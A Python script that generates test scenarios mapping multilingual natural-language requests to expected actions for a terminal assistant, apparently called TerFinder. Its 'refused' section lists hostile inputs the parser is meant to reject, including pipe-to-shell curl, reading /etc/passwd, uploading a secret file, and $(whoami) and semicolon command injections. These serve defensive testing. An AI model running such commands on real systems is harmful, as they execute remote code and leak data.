#!/usr/bin/env python3
"""Generate distinct, user-facing TerFinder interpretation scenarios.

The catalog deliberately varies both wording and concrete entities.  It is not
an endurance loop: every returned phrase is unique and has one explicit
expected result.
"""

from __future__ import annotations

import json
import pathlib
from collections import Counter
from dataclasses import dataclass


ROOT = pathlib.Path(__file__).resolve().parent.parent


@dataclass(frozen=True)
class Scenario:
    category: str
    phrase: str
    action: str | None
    fields: tuple[tuple[str, object], ...] = ()

    def expected_fields(self) -> dict[str, object]:
        return dict(self.fields)


class Catalog:
    def __init__(self) -> None:
        self._items: dict[str, Scenario] = {}

    def add(
        self,
        category: str,
        phrase: str,
        action: str | None,
        **fields: object,
    ) -> None:
        phrase = " ".join(phrase.split())
        if not phrase:
            raise ValueError("scenario phrase cannot be empty")
        scenario = Scenario(category, phrase, action, tuple(sorted(fields.items())))
        previous = self._items.get(phrase)
        if previous is not None and previous != scenario:
            raise ValueError(f"conflicting scenario for {phrase!r}: {previous} vs {scenario}")
        self._items[phrase] = scenario

    def items(self) -> list[Scenario]:
        return list(self._items.values())


def build_catalog() -> list[Scenario]:
    knowledge = json.loads((ROOT / "knowledge" / "phrases.json").read_text())
    terms: dict[str, list[str]] = knowledge["terms"]
    catalog = Catalog()

    apps = ["Safari", "Chrome", "Firefox", "Telegram", "Discord", "Figma"]
    files = [
        "README.md",
        "report.pdf",
        "package.json",
        "notes.txt",
        "config.yaml",
        "archive.zip",
    ]
    directories = ["Downloads", "Documents", "Desktop", "projects", "old-cache"]
    existing_directories = ["Downloads", "Documents", "Desktop"]
    processes = ["python", "node", "rustc", "nginx", "postgres"]
    pids = [42, 321, 1337, 4242, 65530]
    caches = ["pip", "npm", "yarn", "pnpm", "brew", "homebrew", "__pycache__"]
    file_pairs = [
        ("a.txt", "b.txt"),
        ("draft.md", "final.md"),
        ("config.old", "config.new"),
        ("photo.jpg", "photo-copy.jpg"),
        ("data.json", "backup.json"),
    ]

    for verb in terms["open"]:
        for app in apps:
            catalog.add("applications/open", f"{verb} {app}", "OPEN_APP", target=app)
        for file_name in files:
            catalog.add("files/open", f"{verb} {file_name}", "OPEN_FILE", target=file_name)

    for verb in terms["delete"]:
        for app in apps:
            catalog.add("applications/remove", f"{verb} {app}", "REMOVE_APP", target=app)
        for file_name in files:
            catalog.add("files/delete", f"{verb} {file_name}", "DELETE_FILE", target=file_name)
        for directory in directories:
            catalog.add(
                "directories/delete",
                f"{verb} folder {directory}",
                "DELETE_DIRECTORY",
                target=directory,
            )

    for verb in terms["kill"]:
        for app in apps:
            catalog.add("applications/quit", f"{verb} {app}", "QUIT_APP", target=app)
        for pid in pids:
            catalog.add(
                "processes/kill-pid",
                f"{verb} process {pid}",
                "KILL_PROCESS",
                pid=pid,
            )

    for verb in terms["find"]:
        for app in apps:
            catalog.add("applications/find", f"{verb} app {app}", "FIND_APP", target=app)
        for file_name in files:
            catalog.add("files/find", f"{verb} {file_name}", "FIND_FILE", target=file_name)
        for process in processes:
            catalog.add(
                "processes/find",
                f"{verb} process {process}",
                "FIND_PROCESS",
                target=process,
            )

    extensions = ["json", "toml", "yaml", "md", "rs", "py", "ts", "tsx"]
    extension_templates = [
        "найди здесь все файлы с расширением {extension}",
        "покажи файлы с расширением {extension} в текущем проекте",
        "find all {extension} extension files in the current project",
        "find .{extension} files here",
    ]
    for template in extension_templates:
        for extension in extensions:
            catalog.add(
                "files/find-recursive-extension",
                template.format(extension=extension),
                "FIND_FILES",
                target=".",
                file_extension=extension,
                limit=500,
            )
    for name in ["README", "LICENSE", "Dockerfile", "Makefile", "CHANGELOG"]:
        for template in [
            "найди {name} в текущем проекте",
            "find {name} in the current project",
            "locate {name} in this project",
        ]:
            catalog.add(
                "files/find-recursive-name",
                template.format(name=name),
                "FIND_FILES",
                target=".",
                name_contains=name.lower(),
                limit=500,
            )

    for verb in terms["move"]:
        for source, destination in file_pairs:
            catalog.add(
                "files/move",
                f"{verb} {source} to {destination}",
                "MOVE_FILE",
                source=source,
                destination=destination,
            )

    for verb in terms["rename"]:
        for source, destination in file_pairs:
            catalog.add(
                "files/rename",
                f"{verb} {source} to {destination}",
                "RENAME_FILE",
                source=source,
                destination=destination,
            )

    for verb in terms["copy"]:
        for source, destination in file_pairs:
            catalog.add(
                "files/copy",
                f"{verb} {source} to {destination}",
                "COPY_FILE",
                source=source,
                destination=destination,
            )

    for verb in terms["read"]:
        for file_name in files:
            catalog.add("files/read", f"{verb} {file_name}", "READ_FILE", target=file_name)

    for verb in terms["clear"]:
        for cache in caches:
            catalog.add("cache/clear", f"{verb} {cache} cache", "CLEAR_CACHE", target=cache)

    for verb in terms["size"]:
        for directory in existing_directories:
            catalog.add(
                "directories/size",
                f"{verb} {directory}",
                "DIRECTORY_SIZE",
                target=directory,
            )

    for verb in terms["list"]:
        for directory in directories:
            catalog.add(
                "directories/list",
                f"{verb} {directory}",
                "LIST_DIRECTORY",
                target=directory,
            )

    for verb in terms["mkdir"]:
        for directory in directories:
            catalog.add(
                "directories/create",
                f"{verb} {directory}",
                "CREATE_DIRECTORY",
                target=directory,
            )

    for verb in terms["cd"]:
        for directory in directories:
            catalog.add(
                "directories/change",
                f"{verb} {directory}",
                "CHANGE_DIRECTORY",
                target=directory,
            )

    port_queries = [
        "кто на порту {port}",
        "кто сидит на порту {port}",
        "что слушает порт {port}",
        "какой процесс занимает порт {port}",
        "найди процесс на порту {port}",
        "who uses port {port}",
        "what is listening on port {port}",
        "which process grabbed port {port}",
        "find process using port {port}",
        "lsof port {port}",
        "port {port} occupied by what",
        "what's on {port}",
    ]
    port_kills = [
        "освободи порт {port}",
        "убей процесс на порту {port}",
        "закрой то что слушает порт {port}",
        "останови процесс на порту {port}",
        "выруби процесс занимающий порт {port}",
        "free port {port}",
        "kill process on port {port}",
        "stop process listening on port {port}",
        "terminate process using port {port}",
        "close whatever uses port {port}",
    ]
    ports = [80, 443, 3000, 4173, 5173, 8000, 8080, 8765, 9000, 65535]
    for template in port_queries:
        for port in ports:
            catalog.add(
                "ports/find",
                template.format(port=port),
                "FIND_PORT_PROCESS",
                port=port,
            )
    for template in port_kills:
        for port in ports:
            catalog.add(
                "ports/kill",
                template.format(port=port),
                "KILL_PORT_PROCESS",
                port=port,
            )

    pid_queries = [
        "что за процесс {pid}",
        "что за PID {pid}",
        "какой процесс имеет PID {pid}",
        "покажи процесс с PID {pid}",
        "what process has PID {pid}",
        "which process is PID {pid}",
    ]
    for template in pid_queries:
        for pid in pids:
            catalog.add(
                "processes/find-pid",
                template.format(pid=pid),
                "FIND_PROCESS",
                pid=pid,
            )

    control_cases = {
        "SET_BLUETOOTH_POWER": {
            "objects": [
                "Bluetooth",
                "bluetooth",
                "blue tooth",
                "блютуз",
                "блютус",
                "блутуз",
                "блутус",
            ],
            "on": [
                "turn on {object}",
                "turn {object} on",
                "switch {object} on",
                "set {object} on",
                "enable {object}",
                "включи {object}",
                "активируй {object}",
                "подними {object}",
            ],
            "off": [
                "turn off {object}",
                "turn {object} off",
                "switch {object} off",
                "set {object} off",
                "disable {object}",
                "выключи {object}",
                "отключи {object}",
                "отруби {object}",
            ],
        },
        "SET_STAGE_MANAGER": {
            "objects": [
                "Stage Manager",
                "StageManager",
                "stage-manager",
                "стейдж менеджер",
                "стейджменеджер",
                "постановщик",
            ],
            "on": [
                "turn on {object}",
                "turn {object} on",
                "switch {object} on",
                "set {object} on",
                "enable {object}",
                "включи {object}",
                "активируй {object}",
            ],
            "off": [
                "turn off {object}",
                "turn {object} off",
                "switch {object} off",
                "set {object} off",
                "disable {object}",
                "выключи {object}",
                "отключи {object}",
            ],
        },
    }
    for action, definition in control_cases.items():
        for state in ("on", "off"):
            for template in definition[state]:
                for object_name in definition["objects"]:
                    catalog.add(
                        "controls/toggle",
                        template.format(object=object_name),
                        action,
                        target=state,
                    )

    airdrop_objects = ["AirDrop", "airdrop", "Air Drop", "эйрдроп", "эирдроп", "аирдроп"]
    airdrop_modes = {
        "on": ["turn on {object}", "turn {object} on", "enable {object}", "включи {object}"],
        "off": ["turn off {object}", "turn {object} off", "disable {object}", "выключи {object}"],
        "contacts": ["{object} contacts only", "{object} only for contacts", "{object} только для контактов"],
        "everyone": ["{object} for everyone", "enable {object} for everyone", "{object} для всех"],
    }
    for mode, templates in airdrop_modes.items():
        for template in templates:
            for object_name in airdrop_objects:
                catalog.add(
                    "controls/airdrop",
                    template.format(object=object_name),
                    "SET_AIRDROP_MODE",
                    target=mode,
                )

    exact_phrases = {
        "SHOW_DISK_USAGE": [
            "disk usage",
            "место на диске",
            "сколько свободно на диске",
            "сколько места осталось",
            "сколько места занято",
            "сколько места свободно",
            "how much free space",
            "how much space is left",
            "free space",
            "свободное место",
            "am I about to run out of storage",
            "сколько осталось места на маке",
        ],
        "SHOW_BATTERY": [
            "battery level",
            "battery charge",
            "battery percentage",
            "сколько у меня зарядки",
            "покажи заряд батареи",
            "заряд батареи",
            "hoeveel batterij heb ik nog",
            "كم تبقى من البطارية",
            "berapa persen baterai",
        ],
        "PRINT_WORKING_DIRECTORY": [
            "pwd",
            "где я",
            "where am i",
            "current directory",
            "текущая папка",
            "what folder this terminal is in",
            "which folder am i in",
            "где сейчас терминал",
        ],
        "WHO_AM_I": [
            "whoami",
            "кто я",
            "which user am i",
            "what account am i using",
            "account is this shell using",
            "какой аккаунт сейчас используется",
        ],
        "SHOW_DATE": [
            "date",
            "какое сегодня число",
            "который час",
            "what time is it",
            "what's the time",
            "hora actual",
            "tell me when it is",
            "what day is it",
            "какой сейчас день",
        ],
        "SHOW_HOSTNAME": [
            "hostname",
            "как называется компьютер",
            "computer name",
            "nombre del equipo",
            "what is this machine called",
            "что за имя у этого мака",
        ],
        "SHOW_SYSTEM_INFO": [
            "system info",
            "system information",
            "about this mac",
            "информация о системе",
            "сведения о системе",
            "информація про систему",
            "información del sistema",
            "informacion del sistema",
            "systeminformationen",
            "informations système",
            "informations systeme",
            "informações do sistema",
            "informacoes do sistema",
            "informazioni di sistema",
            "informacje o systemie",
            "sistem bilgisi",
            "systeeminformatie",
            "informace o systému",
            "informace o systemu",
            "系统信息",
            "システム情報",
            "시스템 정보",
            "معلومات النظام",
            "सिस्टम जानकारी",
        ],
        "SHOW_UPTIME": [
            "uptime",
            "how long has the computer been running",
            "how long is the mac running",
            "сколько работает компьютер",
            "сколько работает мак",
            "час роботи системи",
            "tiempo de actividad",
            "systemlaufzeit",
            "durée de fonctionnement",
            "duree de fonctionnement",
            "tempo de atividade",
            "tempo di attività",
            "tempo di attivita",
            "czas działania systemu",
            "czas dzialania systemu",
            "sistem çalışma süresi",
            "sistem calisma suresi",
            "systeemuptime",
            "doba běhu systému",
            "doba behu systemu",
            "运行时间",
            "稼働時間",
            "가동 시간",
            "مدة التشغيل",
            "सिस्टम अपटाइम",
        ],
        "SHOW_MEMORY": [
            "memory usage",
            "ram usage",
            "memory info",
            "сколько занято памяти",
            "использование памяти",
            "використання пам'яті",
            "uso de memoria",
            "speicherauslastung",
            "utilisation de la mémoire",
            "utilisation de la memoire",
            "uso de memória",
            "uso de memoria ram",
            "utilizzo memoria",
            "użycie pamięci",
            "uzycie pamieci",
            "bellek kullanımı",
            "bellek kullanimi",
            "geheugengebruik",
            "využití paměti",
            "vyuziti pameti",
            "内存使用",
            "メモリ使用量",
            "메모리 사용량",
            "استخدام الذاكرة",
            "मेमोरी उपयोग",
        ],
        "SHOW_CPU": [
            "cpu info",
            "processor info",
            "which processor",
            "какой процессор",
            "информация о процессоре",
            "який процесор",
            "información del procesador",
            "informacion del procesador",
            "prozessorinfo",
            "informations processeur",
            "informações do processador",
            "informacoes do processador",
            "informazioni processore",
            "informacje o procesorze",
            "işlemci bilgisi",
            "islemci bilgisi",
            "processorinformatie",
            "informace o procesoru",
            "处理器信息",
            "プロセッサ情報",
            "프로세서 정보",
            "معلومات المعالج",
            "प्रोसेसर जानकारी",
        ],
        "SHOW_NETWORK": [
            "network info",
            "network information",
            "ip address",
            "my ip",
            "покажи ip адрес",
            "мой ip адрес",
            "інформація про мережу",
            "dirección ip",
            "direccion ip",
            "netzwerkinformationen",
            "adresse ip",
            "endereço ip",
            "endereco ip",
            "indirizzo ip",
            "adres ip",
            "ip adresim",
            "netwerkinformatie",
            "ip adresa",
            "网络信息",
            "ipアドレス",
            "ip 주소",
            "عنوان ip",
            "आईपी पता",
        ],
    }
    for action, phrases in exact_phrases.items():
        for phrase in phrases:
            catalog.add("system/read-only", phrase, action)

    process_lists = [
        "show running processes",
        "list running processes",
        "найди работающие процессы",
        "покажи запущенные процессы",
        "какие процессы запущены",
        "what processes are running",
        "show all processes",
        "list all processes",
    ]
    memory_rankings = [
        "какой процесс занимает больше всего памяти",
        "покажи процессы которые жрут память",
        "top memory processes",
        "processes using most memory",
        "highest memory processes",
        "which process uses most ram",
    ]
    cpu_rankings = [
        "какой процесс грузит cpu",
        "покажи процессы которые жрут cpu",
        "top cpu processes",
        "processes using most cpu",
        "highest cpu processes",
        "which process uses most processor",
    ]
    for phrase in process_lists:
        catalog.add("processes/list", phrase, "LIST_PROCESSES")
    for phrase in memory_rankings:
        catalog.add("processes/rank-memory", phrase, "LIST_PROCESSES", target="memory")
    for phrase in cpu_rankings:
        catalog.add("processes/rank-cpu", phrase, "LIST_PROCESSES", target="cpu")

    for directory in existing_directories:
        for phrase in [
            f"show largest files in {directory}",
            f"покажи самые большие файлы в {directory}",
            f"найди крупные файлы в {directory}",
            f"find files larger than 100 mb in {directory}",
            f"найди файлы больше 1 гб в {directory}",
            f"найди большие видео за месяц в {directory}",
        ]:
            catalog.add("files/large", phrase, "FIND_LARGE_FILES", target=directory)

    request_templates = [
        "отправь запрос на {url}",
        "отправь curl запрос на {url}",
        "сделай HTTP запрос к {url}",
        "выполни GET запрос на {url}",
        "дерни {url}",
        "дёрни {url}",
        "fetch {url}",
        "request {url}",
        "GET {url}",
        "send a request to {url}",
        "make an HTTP request to {url}",
        "perform a GET request against {url}",
        "надішли запит на {url}",
        "envía una solicitud HTTP a {url}",
        "sende eine HTTP Anfrage an {url}",
        "envoie une requête HTTP vers {url}",
        "envie uma requisição HTTP para {url}",
        "invia una richiesta HTTP a {url}",
        "wyślij żądanie HTTP do {url}",
        "{url} adresine HTTP istek gönder",
        "stuur een HTTP verzoek naar {url}",
        "pošli HTTP požadavek na {url}",
        "发送 HTTP 请求到 {url}",
        "{url} に HTTP リクエストを送信",
        "{url}에 HTTP 요청 보내기",
        "أرسل طلب HTTP إلى {url}",
        "{url} पर HTTP अनुरोध भेजें",
    ]
    urls = {
        "example.com": "https://example.com",
        "www.example.com/path": "https://www.example.com/path",
        "api.example.dev/v1/users?limit=10": "https://api.example.dev/v1/users?limit=10",
        "https://example.org/health": "https://example.org/health",
        "http://example.net/status": "http://example.net/status",
        "example.ai/search?q=rust&lang=en": "https://example.ai/search?q=rust&lang=en",
        "localhost:8080/ping": "http://localhost:8080/ping",
        "127.0.0.1:3000/api#ready": "http://127.0.0.1:3000/api#ready",
    }
    for template in request_templates:
        for url, normalized in urls.items():
            catalog.add(
                "http/get",
                template.format(url=url),
                "FETCH_URL",
                target=normalized,
            )

    tool_commands = [
        "git status",
        "git status --short",
        "git log --oneline",
        "git log -n 5",
        "git diff",
        "git diff --cached",
        "git branch --all",
        "git remote -v",
        "git show --stat",
        "git stash list",
        "git version",
        "git rev-parse HEAD",
        "git describe --all",
        "brew list",
        "brew outdated",
        "brew info rust",
        "brew search python",
        "brew config",
        "brew --version",
        "brew deps rust",
        "brew uses openssl",
        "brew home",
        "cargo test",
        "cargo test --offline",
        "cargo check",
        "cargo check --all-targets",
        "cargo build",
        "cargo build --release",
        "cargo clippy --all-targets",
        "cargo fmt --check",
        "cargo tree",
        "cargo metadata --offline",
        "cargo --version",
        "cargo fetch --offline",
    ]
    for phrase in tool_commands:
        catalog.add("developer-tools/allowed", phrase, "RUN_TOOL")

    argv_commands = {
        "LIST_DIRECTORY": ["ls", "ls -la", "ls -lh Downloads", "dir Documents"],
        "READ_FILE": ["cat README.md", "head README.md", "head -n 20 README.md", "type package.json"],
        "CREATE_DIRECTORY": ["mkdir notes", "mkdir -p cache", "md drafts"],
        "COPY_FILE": ["cp a.txt b.txt", "cp config.old config.new"],
        "MOVE_FILE": ["mv a.txt b.txt", "mv draft.md final.md"],
        "DELETE_FILE": ["rm report.pdf", "rm notes.txt"],
        "DELETE_DIRECTORY": ["rm -rf old-cache", "rmdir old-cache"],
        "CHANGE_DIRECTORY": ["cd Downloads", "chdir Documents", "cd"],
        "DIRECTORY_SIZE": ["du Downloads", "du Documents"],
        "KILL_PROCESS": ["kill 4242", "kill -TERM 1337"],
        "FIND_PORT_PROCESS": ["lsof -i :3000", "lsof -iTCP:8080"],
    }
    for action, phrases in argv_commands.items():
        for phrase in phrases:
            catalog.add("unix-argv/allowed", phrase, action)

    # Real terminal input is rarely a pristine "verb + object" command.  Keep
    # these conversational wrappers as permanent regressions so expanding the
    # parser cannot accidentally make it demand memorized syntax again.
    conversational_bases = [
        ("открой Safari", "OPEN_APP", {"target": "Safari"}),
        ("запусти Telegram", "OPEN_APP", {"target": "Telegram"}),
        ("найди приложение Chrome", "FIND_APP", {"target": "Chrome"}),
        ("закрой Discord", "QUIT_APP", {"target": "Discord"}),
        ("удали Firefox", "REMOVE_APP", {"target": "Firefox"}),
        ("найди report.pdf", "FIND_FILE", {"target": "report.pdf"}),
        ("прочитай README.md", "READ_FILE", {"target": "README.md"}),
        ("удали notes.txt", "DELETE_FILE", {"target": "notes.txt"}),
        ("создай папку drafts", "CREATE_DIRECTORY", {"target": "drafts"}),
        ("перейди в Downloads", "CHANGE_DIRECTORY", {"target": "Downloads"}),
        ("покажи содержимое Documents", "LIST_DIRECTORY", {"target": "Documents"}),
        ("сколько весит Downloads", "DIRECTORY_SIZE", {"target": "Downloads"}),
        ("очисти кеш npm", "CLEAR_CACHE", {"target": "npm"}),
        ("найди процесс python", "FIND_PROCESS", {"target": "python"}),
        ("убей процесс 4242", "KILL_PROCESS", {"pid": 4242}),
        ("кто на порту 3000", "FIND_PORT_PROCESS", {"port": 3000}),
        ("освободи порт 8080", "KILL_PORT_PROCESS", {"port": 8080}),
        ("включи блютуз", "SET_BLUETOOTH_POWER", {"target": "on"}),
        ("выключи AirDrop", "SET_AIRDROP_MODE", {"target": "off"}),
        ("включи Stage Manager", "SET_STAGE_MANAGER", {"target": "on"}),
        ("open Safari", "OPEN_APP", {"target": "Safari"}),
        ("find app Chrome", "FIND_APP", {"target": "Chrome"}),
        ("close Discord", "QUIT_APP", {"target": "Discord"}),
        ("read README.md", "READ_FILE", {"target": "README.md"}),
        ("create folder drafts", "CREATE_DIRECTORY", {"target": "drafts"}),
        ("find process node", "FIND_PROCESS", {"target": "node"}),
        ("free port 5173", "KILL_PORT_PROCESS", {"port": 5173}),
        ("turn Bluetooth off", "SET_BLUETOOTH_POWER", {"target": "off"}),
    ]
    russian_wrappers = [
        "слушай",
        "эй",
        "эй tf",
        "tf",
        "терфайндер",
        "терфиндер",
        "короче",
        "ну-ка",
        "окей",
        "ладно",
        "быстро",
        "срочно",
        "будь добр",
        "будь добра",
        "бро",
        "можешь",
        "можете",
        "можешь пожалуйста",
        "можете пожалуйста",
        "давай",
        "давай быстро",
        "пожалуйста",
    ]
    english_wrappers = [
        "hey",
        "hey tf",
        "tf",
        "terfinder",
        "listen",
        "okay",
        "ok",
        "quickly",
        "please",
        "please can you",
        "can you",
        "could you",
        "would you",
        "i want to",
        "i need to",
        "just",
    ]
    for phrase, action, fields in conversational_bases:
        wrappers = english_wrappers if phrase[0].isascii() else russian_wrappers
        for wrapper in wrappers:
            catalog.add(
                "conversation/wrapped-commands",
                f"{wrapper} {phrase}",
                action,
                **fields,
            )

    numbered_bases = conversational_bases + [
        ("отправь запрос на example.com", "FETCH_URL", {"target": "https://example.com"}),
        ("покажи самые большие файлы в Downloads", "FIND_LARGE_FILES", {"target": "Downloads"}),
        ("найди здесь все файлы с расширением json", "FIND_FILES", {"target": ".", "file_extension": "json", "limit": 500}),
        ("покажи запущенные процессы", "LIST_PROCESSES", {}),
    ]
    for marker in ["1.", "2)", "03:", "7.", "10)", "21.", "42:", "100."]:
        for phrase, action, fields in numbered_bases:
            catalog.add(
                "conversation/numbered-input",
                f"{marker} {phrase}",
                action,
                **fields,
            )

    natural_questions = {
        "SHOW_DISK_USAGE": [
            "куда делось место на диске",
            "что с местом на диске",
            "диск скоро закончится",
            "хватит ли места на диске",
            "is my disk almost full",
            "do i have enough disk space",
        ],
        "SHOW_BATTERY": [
            "сколько заряда осталось",
            "батарея скоро сядет",
            "какой сейчас заряд",
            "how much battery is left",
            "is the battery low",
        ],
        "PRINT_WORKING_DIRECTORY": [
            "где я в терминале",
            "в какой папке терминал",
            "покажи текущий путь",
            "show my current path",
            "what is the current working directory",
        ],
        "WHO_AM_I": [
            "под каким пользователем я работаю",
            "чей это терминал",
            "show the current user",
            "what user is this shell running as",
        ],
        "SHOW_HOSTNAME": [
            "как зовут этот компьютер",
            "какой hostname у мака",
            "show this computer hostname",
            "what is this computer name",
        ],
        "SHOW_SYSTEM_INFO": [
            "что у меня за мак",
            "какая версия macos",
            "покажи характеристики мака",
            "show macos version",
            "tell me about this mac",
        ],
        "SHOW_UPTIME": [
            "давно ли включен мак",
            "когда мак перезагружался",
            "сколько система без перезагрузки",
            "when was this mac restarted",
            "how long since reboot",
        ],
        "SHOW_MEMORY": [
            "сколько свободной оперативки",
            "что с оперативной памятью",
            "покажи состояние ram",
            "how much ram is available",
            "show ram pressure",
        ],
        "SHOW_CPU": [
            "что у меня за процессор",
            "какой cpu стоит",
            "покажи модель процессора",
            "what cpu does this mac have",
            "show processor model",
        ],
        "SHOW_NETWORK": [
            "какой у меня локальный ip",
            "покажи сетевые адреса",
            "что с сетью",
            "show local ip address",
            "what are my network addresses",
        ],
    }
    for action, phrases in natural_questions.items():
        for phrase in phrases:
            catalog.add("questions/system-state", phrase, action)

    git_questions = [
        ("покажи последние {count} коммитов", ["log", "-n", "{count}", "--oneline"]),
        ("какие были последние {count} коммитов", ["log", "-n", "{count}", "--oneline"]),
        ("show latest {count} git commits", ["log", "-n", "{count}", "--oneline"]),
        ("show last {count} commits", ["log", "-n", "{count}", "--oneline"]),
    ]
    for count in [1, 3, 5, 10, 20, 50, 100, 500]:
        expected_count = str(min(count, 100))
        for template, argv in git_questions:
            catalog.add(
                "questions/git-history",
                template.format(count=count),
                "RUN_TOOL",
                target="git",
                argv=[part.format(count=expected_count) for part in argv],
            )
    for phrase in [
        "какая сейчас ветка git",
        "в какой ветке я сейчас",
        "покажи текущую ветку",
        "what is the current git branch",
        "which branch am i currently on",
        "show current branch",
    ]:
        catalog.add(
            "questions/git-branch",
            phrase,
            "RUN_TOOL",
            target="git",
            argv=["rev-parse", "--abbrev-ref", "HEAD"],
        )
    for phrase in [
        "какие файлы изменены в git",
        "что изменилось в репозитории",
        "покажи измененные файлы",
        "show changed files in git",
        "which files are modified",
        "what files changed in the repository",
    ]:
        catalog.add(
            "questions/git-changes",
            phrase,
            "RUN_TOOL",
            target="git",
            argv=["status", "--short"],
        )

    for extension in ["json", "yaml", "toml", "md", "rs", "py", "js", "ts", "tsx", "css", "html", "log"]:
        for template in [
            "найди все .{extension} файлы здесь",
            "где в текущем проекте файлы .{extension}",
            "покажи здесь файлы расширения {extension}",
            "search this project for .{extension} files",
            "where are the .{extension} files in the current directory",
            "list all {extension} extension files here",
        ]:
            catalog.add(
                "questions/recursive-extension-search",
                template.format(extension=extension),
                "FIND_FILES",
                target=".",
                file_extension=extension,
                limit=500,
            )
    for name in ["README", "LICENSE", "Dockerfile", "Makefile", "CHANGELOG", "package", "config", "test", "fixture", "schema"]:
        for template in [
            "поищи {name} в текущем проекте",
            "покажи где лежит {name} в этом проекте",
            "search for {name} in the current project",
            "show me where {name} is in this project",
        ]:
            catalog.add(
                "questions/recursive-name-search",
                template.format(name=name),
                "FIND_FILES",
                target=".",
                name_contains=name.lower(),
                limit=500,
            )

    for pid in [1, 42, 321, 1337, 4242, 9999, 46272, 65530]:
        for template in [
            "кому принадлежит PID {pid}",
            "что работает с PID {pid}",
            "покажи детали процесса {pid}",
            "who owns PID {pid}",
            "show details for process {pid}",
            "identify PID {pid}",
        ]:
            catalog.add(
                "questions/process-by-pid",
                template.format(pid=pid),
                "FIND_PROCESS",
                pid=pid,
            )

    process_question_cases = [
        ("что сейчас больше всего грузит память", "memory"),
        ("кто съел всю оперативку", "memory"),
        ("какие процессы используют больше всего ram", "memory"),
        ("what is consuming the most memory", "memory"),
        ("show the biggest ram consumers", "memory"),
        ("что сейчас больше всего грузит процессор", "cpu"),
        ("кто жрет cpu", "cpu"),
        ("какие процессы нагружают процессор", "cpu"),
        ("what is consuming the most cpu", "cpu"),
        ("show the busiest cpu processes", "cpu"),
        ("какие браузеры сейчас открыты", "browser"),
        ("покажи работающие браузеры", "browser"),
        ("which browsers are currently running", "browser"),
        ("show open browser processes", "browser"),
        ("почему компьютер тормозит", "diagnostic"),
        ("помоги понять почему мак медленный", "diagnostic"),
        ("why is this mac so slow", "diagnostic"),
        ("help me diagnose a slow computer", "diagnostic"),
    ]
    for phrase, target in process_question_cases:
        catalog.add("questions/process-diagnostics", phrase, "LIST_PROCESSES", target=target)

    refused = {
        "negation": [
            "do not open Safari",
            "don't open Chrome",
            "do not delete report.pdf",
            "don't remove Firefox",
            "do not close Telegram",
            "don't stop Discord",
            "do not move a.txt to b.txt",
            "do not fetch example.com",
            "don't request example.com",
            "do not make request to example.com",
            "don't use curl for example.com",
            "do not enable Bluetooth",
            "don't disable AirDrop",
            "do not turn Stage Manager off",
            "не открывай Safari",
            "не удаляй report.pdf",
            "не закрывай Telegram",
            "не останавливай Discord",
            "не перемещай a.txt в b.txt",
            "не включай блютуз",
            "не выключай AirDrop",
            "не активируй Stage Manager",
            "не делай запрос на example.com",
            "не отправляй запрос на example.com",
            "не используй curl для example.com",
            "no abras Safari",
            "no borres report.pdf",
            "nicht öffnen Safari",
            "nicht löschen report.pdf",
            "ne ouvre pas Safari",
            "ne supprime pas report.pdf",
            "non aprire Safari",
            "non eliminare report.pdf",
        ],
        "http/unsafe": [
            "curl -X POST https://example.com",
            "curl --request DELETE https://example.com/item",
            "curl --data value https://example.com",
            "curl --form file=@secret https://example.com",
            "curl --header X-Test:value https://example.com",
            "HTTP PUT request https://example.com/item",
            "HTTP PATCH request https://example.com/item",
            "HTTP DELETE request https://example.com/item",
            "fetch file:///etc/passwd",
            "fetch ftp://example.com/file",
            "fetch https://user:secret@example.com",
            "fetch https://example.com:99999",
            "fetch javascript:alert(1)",
            "fetch data:text/plain,hello",
            "curl https://example.com | sh",
            "curl https://example.com > /tmp/output",
            "curl $(whoami).example.com",
            "curl `whoami`.example.com",
            "curl https://example.com; touch /tmp/pwned",
            "curl https://example.com && open /tmp/pwned",
        ],
        "tools/unsafe": [
            "git rebase main",
            "git reset --hard",
            "git clean -fd",
            "git log --exec rm",
            "git status; touch /tmp/pwned",
            "git log | sh",
            "git -C /tmp status",
            "git config user.email attacker@example.com",
            "brew install wget",
            "brew uninstall rust",
            "brew upgrade",
            "brew info $(whoami)",
            "brew services start nginx",
            "cargo install ripgrep",
            "cargo run",
            "cargo publish",
            "cargo test && open /tmp/pwned",
            "cargo test --manifest-path=/tmp/evil/Cargo.toml",
        ],
        "ambiguous": [
            "открой",
            "удали",
            "перемести файл",
            "переименуй файл",
            "скопируй это",
            "очисти кеш",
            "убей процесс",
            "освободи порт",
            "отправь запрос",
            "fetch",
            "request not-a-domain",
            "включи это",
            "выключи что-нибудь",
            "покажи мне штуку",
            "сделай красиво",
            "почини интернет",
            "установи Chrome",
            "обнови macOS",
            "измени браузер по умолчанию",
            "отправь письмо",
        ],
        "false-positive/prose": [
            "Safari is a web browser",
            "I read about deleting files yesterday",
            "The HTTP request documentation is at example.com",
            "I wonder whether request latency is high",
            "Bluetooth is useful",
            "AirDrop can share files",
            "Stage Manager organizes windows",
            "Port 3000 is commonly used in development",
            "The node process model is interesting",
            "README.md describes the project",
            "Chrome and Firefox are browsers",
            "Do you know what curl is",
            "Explain how git status works",
            "Tell me about CPU architecture",
            "Почему память называется оперативной",
            "Что такое блютуз",
            "Расскажи про AirDrop",
            "Как работает порт 8080",
            "Зачем нужен файл package.json",
            "Сравни Safari и Chrome",
        ],
    }
    for category, phrases in refused.items():
        for phrase in phrases:
            catalog.add(f"refused/{category}", phrase, None)

    return catalog.items()


def category_counts(scenarios: list[Scenario]) -> dict[str, int]:
    return dict(sorted(Counter(item.category for item in scenarios).items()))


if __name__ == "__main__":
    generated = build_catalog()
    print(
        json.dumps(
            {
                "unique_scenarios": len(generated),
                "categories": category_counts(generated),
            },
            ensure_ascii=False,
            indent=2,
        )
    )
